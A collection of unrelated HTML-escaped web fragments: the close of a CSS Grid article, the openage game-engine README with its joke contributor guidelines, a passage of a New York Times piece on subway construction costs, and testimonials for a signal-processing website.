&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*_hrfaUunhJtpYCGcM-eIIw.png&quot; data-width=&quot;2010&quot; data-height=&quot;918&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*_hrfaUunhJtpYCGcM-eIIw.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*_hrfaUunhJtpYCGcM-eIIw.png&quot;/&gt;&lt;/div&gt;
Layout your color swatches in your style guide using CSS Grid.
&lt;p name=&quot;226f&quot; id=&quot;226f&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Alternatively, you can take a progressive enhancement approach on just one component at a time. Use feature queries to wrap your grid declarations and you’ll be able to start using CSS Grid without having to make sweeping changes to your whole site all at once.&lt;/p&gt;
&lt;p name=&quot;9df3&quot; id=&quot;9df3&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Start small, start simple, and build it up slowly! I promise it’s worth it.&lt;/p&gt;
&lt;p name=&quot;8a8f&quot; id=&quot;8a8f&quot; class=&quot;graf graf--p graf-after--p graf--trailing&quot;&gt;I hope you’ll share your work! It’s an exciting time for layout on the web. &lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;Get creative and make something new.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;openage&lt;/strong&gt;: a volunteer project to create a free engine clone of the &lt;em&gt;Genie Engine&lt;/em&gt; used by &lt;em&gt;Age of Empires&lt;/em&gt;, &lt;em&gt;Age of Empires II (HD)&lt;/em&gt; and &lt;em&gt;Star Wars: Galactic Battlegrounds&lt;/em&gt;, comparable to projects like &lt;a href=&quot;https://openmw.org/&quot; rel=&quot;nofollow&quot;&gt;OpenMW&lt;/a&gt;, &lt;a href=&quot;http://openra.net/&quot; rel=&quot;nofollow&quot;&gt;OpenRA&lt;/a&gt;, &lt;a href=&quot;https://openttd.org/&quot; rel=&quot;nofollow&quot;&gt;OpenTTD&lt;/a&gt; and &lt;a href=&quot;https://openrct2.org/&quot; rel=&quot;nofollow&quot;&gt;OpenRCT2&lt;/a&gt;. At the moment we focus our efforts on the integration of &lt;em&gt;Age of Empires II&lt;/em&gt;, while being primarily aimed at POSIX platforms such as &lt;strong&gt;GNU/Linux&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;openage uses the original game assets (such as sounds and graphics), but (for obvious reasons) doesn't ship them. To play, you require &lt;em&gt;an original AoE II : TC installation or &lt;a href=&quot;http://store.steampowered.com/app/221380/&quot; rel=&quot;nofollow&quot;&gt;AoE II: HD&lt;/a&gt;&lt;/em&gt; (installation via &lt;a href=&quot;https://www.winehq.org/&quot; rel=&quot;nofollow&quot;&gt;Wine&lt;/a&gt; or &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/media_convert.md#how-to-use-the-original-game-assets&quot;&gt;Steam-Linux&lt;/a&gt;).&lt;/p&gt;

&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Humans&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Mixing together all of the above&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Our goals &lt;em&gt;include&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Fully authentic look and feel
&lt;ul&gt;&lt;li&gt;This can only be approximated, since the behaviour of the original game is mostly undocumented, and guessing/experimenting can only get you this close&lt;/li&gt;
&lt;li&gt;We will not implement useless artificial limitations (max 30 selectable units...)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Multiplayer (obviously)&lt;/li&gt;
&lt;li&gt;Matchmaking and ranking with a &lt;a href=&quot;https://github.com/SFTtech/openage-masterserver&quot;&gt;haskell masterserver&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Optionally, &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/ideas&quot;&gt;improvements&lt;/a&gt; over the original game&lt;/li&gt;
&lt;li&gt;AI scripting in Python, you can use &lt;a href=&quot;http://scikit-learn.org/stable/&quot; rel=&quot;nofollow&quot;&gt;machine learning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Re-creating &lt;a href=&quot;https://github.com/SFTtech/openage-data&quot;&gt;free game assets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;An easily-moddable content format: &lt;a href=&quot;https://github.com/SFTtech/nyan&quot;&gt;&lt;strong&gt;nyan&lt;/strong&gt; yet another notation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;An integrated Python console and API, comparable to &lt;a href=&quot;https://www.blender.org/&quot; rel=&quot;nofollow&quot;&gt;blender&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Awesome infrastructure such as our own &lt;a href=&quot;https://github.com/SFTtech/kevin&quot;&gt;Kevin CI service&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;But beware, for sanity reasons:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;No network compatibility with the original game. You really wanna have the same problems again?&lt;/li&gt;
&lt;li&gt;No binary compatibility with the original game. A one-way script to convert maps/savegames/missions to openage is planned though.&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;Current State of the Project&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;What features are currently implemented?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;What's the plan?&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;Dependencies, Building and Running&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;How do I get this to run on my box?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;I compiled everything. Now how do I run it?&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Execute &lt;code&gt;./run&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/media_convert.md&quot;&gt;The convert script&lt;/a&gt; will transform original assets into openage formats, which are a lot saner and more moddable.&lt;/li&gt;
&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Use your brain and react to the things you'll see.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Waaaaaah! It&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;segfaults&lt;/li&gt;
&lt;li&gt;prints error messages I don't want to read&lt;/li&gt;
&lt;li&gt;ate my dog&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;All of those are features, not bugs.&lt;/p&gt;
&lt;p&gt;To turn them off, use &lt;code&gt;./run --dont-segfault --no-errors --dont-eat-dog&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If this still does not help, try our &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/troubleshooting.md&quot;&gt;troubleshooting guide&lt;/a&gt;, the &lt;a href=&quot;https://github.com/SFTtech/openage#contact&quot;&gt;contact section&lt;/a&gt; or the &lt;a href=&quot;https://github.com/SFTtech/openage/issues&quot;&gt;bug tracker&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Development Process&lt;/h2&gt;
&lt;p&gt;What does openage development look like in practice?&lt;/p&gt;
&lt;p&gt;Can I help?&lt;/p&gt;
&lt;p&gt;All documentation is also in this repo:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Code documentation is embedded in the sources for Doxygen (see &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/README.md&quot;&gt;doc readme&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;Have a look at the &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc&quot;&gt;doc directory&lt;/a&gt;. This folder tends to outdate when code changes.&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;macOS Version&lt;/h2&gt;
&lt;p&gt;Running openage on macOS worked in the past, and might or might not work right now.&lt;/p&gt;
&lt;p&gt;Setting up continuous integration for this platform has some complications. Running a hackintosh VM seems to be not so legal, while buying dedicated hardware for it seems to be not so cheap. If you know of a legal and cost-free way of doing so or want to sponsor a semi-recent Mac Mini, please open a ticket in our issue tracker. Until then, PRs untested on macOS will make their way into the master branch and occasional breakage will occur.&lt;/p&gt;
&lt;h2&gt;Windows Version&lt;/h2&gt;
&lt;p&gt;The Windows port of openage is under development.&lt;/p&gt;
&lt;p&gt;Setting up continuous integration for this platform has problems similar to the OSX version. If you know of a legal and cost-free way of acquiring and running a Windows VM, please open a ticket in our issue tracker. Until then, PRs untested on Windows will make their way into the master branch and occasional breakage will occur.&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;Being typical computer science students, we hate people.&lt;/li&gt;
&lt;li&gt;Please don't contact us.&lt;/li&gt;
&lt;li&gt;Nobody likes Age of Empires anyway.&lt;/li&gt;
&lt;li&gt;None of you is interested in making openage more awesome anyway.&lt;/li&gt;
&lt;li&gt;We don't want a community.&lt;/li&gt;
&lt;li&gt;Don't even think about trying to help.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Guidelines:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;No &lt;strong&gt;bug reports&lt;/strong&gt; or &lt;strong&gt;feature requests&lt;/strong&gt;, the game is perfect as is.&lt;/li&gt;
&lt;li&gt;Don't try to &lt;strong&gt;fix any bugs&lt;/strong&gt;, see above.&lt;/li&gt;
&lt;li&gt;Don't implement any features, your code is crap.&lt;/li&gt;
&lt;li&gt;Don't even think about sending a &lt;strong&gt;pull request&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Please ignore the &lt;a href=&quot;https://github.com/SFTtech/openage/issues?q=is:issue+is:open+label:%22easy%22&quot;&gt;easy tasks&lt;/a&gt; that &lt;a href=&quot;https://github.com/SFTtech/openage/issues?q=is:issue+is:open+label:%22just+do+it%22&quot;&gt;could just be done&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Absolutely never ever participate in this &lt;a href=&quot;https://www.reddit.com/r/openage/&quot; rel=&quot;nofollow&quot;&gt;boring community&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Don't note the irony, you idiot.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;To prevent accidental violation of one of those guidelines, you should &lt;em&gt;never&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;cheers, happy hecking.&lt;/p&gt;
&lt;h2&gt;Contact&lt;/h2&gt;
&lt;p&gt;If you have the desire to perform semi-human interaction, join our &lt;strong&gt;Matrix&lt;/strong&gt; or &lt;strong&gt;IRC&lt;/strong&gt; chatroom!&lt;/p&gt;

Projects start burning through cash long before construction begins.&lt;/p&gt;
&lt;div id=&quot;story-ad-9&quot; class=&quot;story-ad ad ad-placeholder nocontent robots-nocontent&quot;&gt;

&lt;a class=&quot;visually-hidden skip-to-text-link&quot; href=&quot;https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html#story-continues-23&quot;&gt;Continue reading the main story&lt;/a&gt;&lt;/div&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;314&quot; data-total-count=&quot;19567&quot; id=&quot;story-continues-23&quot;&gt;On average, “soft costs” — preliminary design and engineering, plus management while construction is underway — make up about 20 percent of the cost of transit projects in America, according to a 2010 report by the Transportation Research Board. The average is similar in other countries, contractors said.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;16&quot; data-total-count=&quot;19583&quot;&gt;Not in New York.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;326&quot; data-total-count=&quot;19909&quot;&gt;The latest federal oversight report for the Second Avenue subway projected soft cost spending at $1.4 billion — one-third of the budget, not including financing expenses. M.T.A. officials said that number was high because it included some costs for design of later phases of the line. But experts said it was still shocking.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;243&quot; data-total-count=&quot;20152&quot;&gt;“The crazy thing is it’s so high even with everything else,” said Larry Gould, a transit consultant and former M.T.A. subway planner. “If we have three or four times as many workers, how can the percentage for soft costs be so high?”&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;204&quot; data-total-count=&quot;20356&quot;&gt;Soft costs for East Side Access are expected to exceed $2 billion. The project plan called for the hiring of 500 consultants from a dozen different companies, according to a 2009 federal oversight report.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;388&quot; data-total-count=&quot;20744&quot;&gt;Both the Second Avenue subway and East Side Access projects hired the same main engineering firm: WSP USA, formerly known as Parsons Brinckerhoff. The firm, which designed some of New York’s original subway, has donated hundreds of thousands to politicians in recent years, and has hired so many transit officials that some in the system refer to it as “the M.T.A. retirement home.”&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;320&quot; data-total-count=&quot;21064&quot;&gt;The firm was the only vendor to bid on the engineering contract for the Second Avenue subway, records show. On East Side Access, it is sharing the contract with STV Inc., which recently hired the former M.T.A. chairman Thomas F. Prendergast. The contract was initially for $140 million, but it has grown to $481 million.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;216&quot; data-total-count=&quot;21280&quot;&gt;WSP USA declined to answer questions. “WSP has undertaken complex and enduring infrastructure projects across the U.S., and the New York region presents unique needs and challenges,” the firm said in a statement.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;473&quot; data-total-count=&quot;21753&quot;&gt;The M.T.A. is partly to blame. Officials have added to the soft costs by struggling to coordinate between vendors, taking a long time to approve plans, insisting on extravagant station designs and changing their minds midway through projects. In 2010, they hired a team of three consultants to work full time on East Side Access “operational readiness” — getting the tunnel ready to open — even though contractors knew construction would not end for another decade.&lt;/p&gt;

&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;350&quot; data-total-count=&quot;22103&quot; id=&quot;story-continues-24&quot;&gt;Janno Lieber, who joined the M.T.A. as chief development officer in April, acknowledged there were parts of the authority’s project management approach that have been “broken” and “self-defeating.” Changing plans midway through projects is a “huge issue,” as is over-customization of designs and poor management of consultants, he said.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;174&quot; data-total-count=&quot;22277&quot;&gt;“We just have to do a much better job,” Mr. Lieber said. “We’re relying on these consultants to run our projects, and we’re not getting good results out of them.”&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;62&quot; data-total-count=&quot;22339&quot;&gt;Others have a more skeptical perspective about the soft costs.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;255&quot; data-total-count=&quot;22594&quot;&gt;Jack Brockway, an executive at Herrenknecht, a German manufacturer of tunnel-boring machines, said he got “stacks and stacks and stacks” of instructions from consultants for his work on the Second Avenue subway, down to details that barely made sense.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;160&quot; data-total-count=&quot;22754&quot;&gt;“It makes you wonder if it’s really necessary, or if they’re just trying to do something to justify how much they’re getting paid,” Mr. Brockway said.&lt;/p&gt;

&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;116&quot; data-total-count=&quot;22889&quot;&gt;Across the Atlantic Ocean, Paris is working on a project that brings the inefficiency of New York into stark relief.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;508&quot; data-total-count=&quot;23397&quot;&gt;The project, called the Line 14 extension, is similar to the Second Avenue subway. Both projects extend decades-old lines in the hopes of reducing systemwide overcrowding. Both involved digging through moderately hard soil just north of the city center to make a few miles of tunnel and a few stations about 80 feet underground. Both used tunnel-boring machines made by Herrenknecht. Both faced strict regulations, high density and demands from neighbors, which limited some construction to 12 hours per day.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;123&quot; data-total-count=&quot;23520&quot;&gt;But while the Second Avenue Subway cost $2.5 billion a mile, the Line 14 extension is on track to cost $450 million a mile.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;121&quot; data-total-count=&quot;23641&quot;&gt;On a recent afternoon at a Line 14 construction site, an official expressed disbelief that New York was spending so much.&lt;/p&gt;

&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;151&quot; data-total-count=&quot;23792&quot; id=&quot;story-continues-25&quot;&gt;“We thought ours was expensive,” said Laurent Probst, managing director of Île-de-France Mobilités, which controls transit in the French capital.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;288&quot; data-total-count=&quot;24080&quot;&gt;As he descended into the hole carved for the future Pont Cardinet station, it became clear how the costs could be so different. Scattered around the cavern were a couple dozen workers, running drills, smoothing over soil and checking electrical systems. Mostly, they worked by themselves.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;126&quot; data-total-count=&quot;24206&quot;&gt;Mr. Probst, 39, wearing a suit and blue tie under his orange safety jacket, pushed the button to operate the elevator himself.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;416&quot; data-total-count=&quot;24622&quot;&gt;France’s unions are powerful, but Mr. Probst said they did not control project staffing. Isabelle Brochard of RATP, a state-owned company that operates the Paris Metro and is coordinating the Line 14 project, estimated there were 200 total workers on the job, each earning $60 per hour. The Second Avenue subway project employed about 700 workers, many making double that (although that included health insurance).&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;236&quot; data-total-count=&quot;24858&quot;&gt;The tunnel-boring machine chewing through dirt north of Pont Cardinet — a secondhand machine, Ms. Brochard noted — was staffed by a dozen laborers who bounced between the control room, the cutting wheel and the sides of the machine.&lt;/p&gt;

&lt;h4&gt;&lt;big&gt;&quot; &lt;span&gt;It is the best source in the entire internet&lt;/span&gt; with such a detailed information, description, examples and theory provided on programmatic realization of peak related techniques and analysis. &quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...the most &lt;span&gt;understandable&lt;/span&gt; documentation I’ve ever encountered!&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;&lt;big&gt;&quot;&lt;/big&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&lt;big&gt;It is as good as, if not &lt;span&gt;better than, any similar books available&lt;/span&gt; in the market&quot;.&lt;/big&gt;&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;
&lt;h4&gt;&lt;big&gt;&quot;...a &lt;span&gt;clear, organized, accessible, and intuitive&lt;/span&gt; resource....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I ... have never seen before (I have years of experience in this field) such a &lt;span&gt;complete approach&lt;/span&gt; towards tackling almost all the analysis problems from scratch....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I like your writing style because it's &lt;span&gt;clear and concise&lt;/span&gt;, and your prose flows so smoothly.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;The signal processing topics you cover are so &lt;span&gt;wonderfully practical...truly impressive&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I ... am &lt;span&gt;very impressed with the clarity&lt;/span&gt; of the presentation.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;... truly &lt;span&gt;one of best&lt;/span&gt; practical description I have ever seen.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I&lt;/big&gt; &lt;big&gt;liked the way everything is setup and explained.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...I think it's the &lt;span&gt;best explanation I've ever seen&lt;/span&gt;. &quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...&lt;span&gt;excellent&lt;/span&gt; documentation and coding....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...thank you for the &lt;span&gt;immense role&lt;/span&gt; your book has played in my perusal of research....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;This is...a &lt;span&gt;teaching paradise&lt;/span&gt;..&lt;big&gt;.&lt;/big&gt;&lt;/span&gt;&lt;big&gt;&lt;span&gt;&lt;small&gt;really &lt;span&gt;priceless&lt;/span&gt;.&lt;/small&gt;&lt;/span&gt;&lt;/big&gt;&lt;span&gt;&quot;&lt;br/&gt;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;&lt;span&gt;What you do makes the world better!&lt;/span&gt;&quot;&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I found your explanation....very &lt;span&gt;simple and clear&lt;/span&gt;. &quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;I was really &lt;span&gt;surprised&lt;/span&gt; by the efficiency of your explanations ...&quot;&lt;span&gt;highly realistic and pragmatic&lt;/span&gt;.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;The sequence of the topics and the explanations are &lt;span&gt;very clear&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I found your curve fitting website and it is &lt;span&gt;awesome&lt;/span&gt;....&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;&lt;span&gt;Love&lt;/span&gt; your web pages.... MANY thanks for all the effort, hard work and time -- not to mention the &lt;span&gt;clarity&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;

&lt;h4&gt;&lt;big&gt;&quot;...I'm &lt;span&gt;astonished&lt;/span&gt; by your work.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...your &lt;span&gt;fantastic&lt;/span&gt; article...has helped me a lot&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...it is an &lt;span&gt;absolutely fantastic&lt;/span&gt; teaching resource.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...your Intro. to Signal Proc. book and software ... [is] ... &lt;span&gt;helpful and thorough&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Thanks again for your generous contributions to the scientific and engineering community, you might not get a lot of feedback (or hopefully you do) but your work is greatly appreciated and will continue to benefit us for years to come.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...your website...represents a &lt;span&gt;wonderful&lt;/span&gt; job....&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...such an enormous amount of knowledge and applied code! It is an &lt;span&gt;enormous help&lt;/span&gt; for analysing my data.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...an &lt;span&gt;excellent source of information&lt;/span&gt; for a subject that I have only encountered scatterered books.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...thank you profusely .... your website has been &lt;span&gt;extremely helpful&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...after days of trying and failing...your site &lt;span&gt;was able to solve my problem in half an hour&lt;/span&gt;.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;I have no words to describe how helpful this is to me ... explaining what they do and how they can be used; on top the examples make it even better.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;... &lt;em&gt;surely &lt;span&gt;the way into heaven&lt;/span&gt;&lt;/em&gt; &lt;em&gt;is to post excellent software online for others to use to do science.&lt;/em&gt;&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...thank you for taking the time to create these &lt;span&gt;incredible&lt;/span&gt; tools.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;I am grateful and &lt;span&gt;overwhelmed&lt;/span&gt; by your kindness in sharing your hard work with us&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;This is a &lt;span&gt;great&lt;/span&gt; website...&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...you &lt;span&gt;saved my time&lt;/span&gt; a lot.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Your effort to produce and maintain this site is &lt;span&gt;GREATLY appreciated&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Your online resource for “signal processing” is &lt;span&gt;fantastic!&lt;/span&gt;&quot;&lt;/big&gt;&lt;/h4&gt;

&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I recently found your website and I’m really impressed, &lt;span&gt;great&lt;/span&gt; work! &quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;Thank you for your time and the &lt;span&gt;wonderful&lt;/span&gt; material (software and text) you have put up on your website.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;Your lessons on signal processing are &lt;span&gt;really useful and intriguing&lt;/span&gt;....&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;I have no words to describe how &lt;span&gt;excited&lt;/span&gt; I am and how thankful I am about your work.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I found your ... website &lt;span&gt;extremely helpful&lt;/span&gt;.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I found your signal processing pages ... &lt;span&gt;very helpful!&lt;/span&gt;&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;I &lt;span&gt;loved&lt;/span&gt; your article on smoothing.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...&lt;span&gt;really clear&lt;/span&gt; and concise.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4/&gt;
&lt;p&gt;&lt;big&gt;&quot; ... &lt;span&gt;very useful&lt;/span&gt; for teaching in an Instrumentation course for M.Sc postgraduates in analytical chemistry.&lt;br/&gt;&lt;/big&gt;&lt;/p&gt;
&lt;p&gt;&lt;big&gt;&quot;[Y]our web site has such &lt;span&gt;excellent&lt;/span&gt; content....&quot;&lt;/big&gt;&lt;/p&gt;
&lt;p&gt;&lt;big&gt;&quot;I tried the demo version of SPECTRUM and I think is a &lt;span&gt;very useful&lt;/span&gt; tool for the introduction of signal processing to analytical chemistry students.&quot;&lt;/big&gt;&lt;/p&gt;
&lt;h4&gt;&quot;&lt;big&gt;Your work is &lt;span&gt;very helpful&lt;/span&gt; to my research.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...your site...has some &lt;span&gt;very valuable&lt;/span&gt; information relevant to the projects I’m currently working on.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...really nice tutorial and Matlab functions that are &lt;span&gt;extremely useful&lt;/span&gt; in many fields of research.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Very generous of you to make &lt;span&gt;so much useful material&lt;/span&gt; freely available.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;I found your website &lt;span&gt;very informative&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;Thank you, Tom, for being a great citizen of MATLAB Central and the File Exchange! You are what makes this community thrive.&quot; (&lt;a href=&quot;http://blogs.mathworks.com/pick/2016/09/09/most-activeinteractive-file-exchange-entry/&quot;&gt;http://blogs.mathworks.com/pick/2016/09/09/most-activeinteractive-file-exchange-entry/&lt;/a&gt;)&lt;/big&gt;&lt;/h4&gt;

&lt;h2 align=&quot;center&quot;&gt;A Brief History of Mine&lt;/h2&gt;

&lt;h3&gt;Digital began to pull away from analog in the 1950s and now completely dominates.&lt;/h3&gt;

&lt;h3&gt;In the mid 1990s, Web sites began to dominate earlier publishing technologies.&lt;/h3&gt;

&lt;h3&gt;Transistors, invented in the late 1940s, pulled ahead of vacuum tunes in the 50s. By the early 80s, integrated circuits chips were dominant.&lt;/h3&gt;

&lt;h3&gt;Statistics and quantitative signal and data processing have long been important, using computers after the 1950s.&lt;/h3&gt;

&lt;h3&gt;&quot;Derivative&quot;, &quot;smoothing&quot;, and &quot;convolution&quot; are old concepts, but other signal processing terms don't become common until more recently.&lt;/h3&gt;

&lt;h3&gt;The most common derivative orders have long been the first and second; higher older are much less used.&lt;/h3&gt;

